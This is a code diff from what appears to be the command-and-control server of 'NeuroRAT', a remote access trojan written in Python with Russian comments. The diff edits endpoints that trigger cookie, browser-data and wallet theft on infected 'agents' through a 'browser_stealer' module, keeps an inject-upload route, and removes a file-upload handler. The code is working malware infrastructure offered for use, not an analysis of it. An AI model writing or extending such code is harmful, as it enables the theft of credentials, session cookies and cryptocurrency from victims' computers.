@@ -47,29 +47,8 @@ try:
     from server_monitor import NeuroRATMonitor
     from api_integration import APIFactory
 except ImportError:
-    # Create placeholder classes if modules don't exist
-    class NeuroRATMonitor:
-        def __init__(self, **kwargs):
-            self.stats = {"server_uptime": 0, "connected_agents": 0, "total_agents": 0}
-        def start(self):
-            pass
-    
-    class APIFactory:
-        @staticmethod
-        def get_openai_integration():
-            return DummyAPI()
-        @staticmethod
-        def get_gemini_integration():
-            return DummyAPI()
-        @staticmethod
-        def get_telegram_integration():
-            return DummyAPI()
-    
-    class DummyAPI:
-        def is_available(self):
-            return False
-        def generate_response(self, *args, **kwargs):
-            return "API not configured"
+    logging.error("Failed to import server_monitor or api_integration modules")
+    sys.exit(1)
 
 # Configure logging
 logging.basicConfig(
@@ -1379,9 +1358,10 @@ if os.path.exists(FRONTEND_DIST_DIR):
 # Перенаправление на React-фронтенд (если доступен)
 @app.get("/chat", include_in_schema=False)
 async def react_chat_redirect():
+    """Перенаправление со старого /chat на новый React-интерфейс"""
     if os.path.exists(FRONTEND_DIST_DIR):
-        return RedirectResponse(url="/app")
-    return RedirectResponse(url="/")
+        return RedirectResponse(url="/app/index.html")
+    return RedirectResponse(url="/dashboard")
 
 if __name__ == "__main__":
     # Обработка аргументов командной строки
@@ -1511,40 +1491,6 @@ async def broadcast_dashboard_event(event: dict):
     for ws in to_remove:
         dashboard_ws_clients.remove(ws)
 
-# --- В местах событий вызываем broadcast_dashboard_event ---
-# Пример для upload файла:
-@app.post("/api/files/upload")
-async def api_files_upload(
-    file: UploadFile = File(...),
-    agent_id: str = Form(...),
-    category: str = Form("other")
-):
-    import uuid, time
-    file_id = str(uuid.uuid4())
-    filename = file.filename
-    save_path = os.path.join(UPLOADS_DIR, f"{file_id}_{filename}")
-    size = 0
-    with open(save_path, "wb") as f_out:
-        while True:
-            chunk = await file.read(1024*1024)
-            if not chunk:
-                break
-            f_out.write(chunk)
-            size += len(chunk)
-    entry = {
-        "file_id": file_id,
-        "name": filename,
-        "agent_id": agent_id,
-        "size": size,
-        "category": category,
-        "timestamp": time.time(),
-        "path": save_path
-    }
-    files_data.append(entry)
-    # --- WS уведомление ---
-    asyncio.create_task(broadcast_dashboard_event({"type": "file", "action": "add", "file": {k:v for k,v in entry.items() if k!="path"}}))
-    return {"success": True, "file_id": file_id, "name": filename, "uploaded": True}
-
 @app.post("/api/injects/upload")
 async def api_injects_upload(file: UploadFile = File(...)):
     import uuid, time
@@ -1605,17 +1551,7 @@ async def steal_wallets(agent_id: str):
 
 @app.post("/api/agent/{agent_id}/cookies/steal")
 async def steal_cookies(agent_id: str):
-    """Запуск модуля кражи cookies для агента"""
-    try:
-        loader = ModuleLoader()
-        result = loader.run_module("browser_stealer")
-        return {"status": "success", "result": result}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
-
-@app.post("/api/agent/{agent_id}/browser/steal")
-async def steal_browser_data(agent_id: str):
-    """Запуск модуля кражи browser data для агента"""
+    """Запуск модуля кражи cookies и browser data для агента"""
     try:
         loader = ModuleLoader()
         result = loader.run_module("browser_stealer")
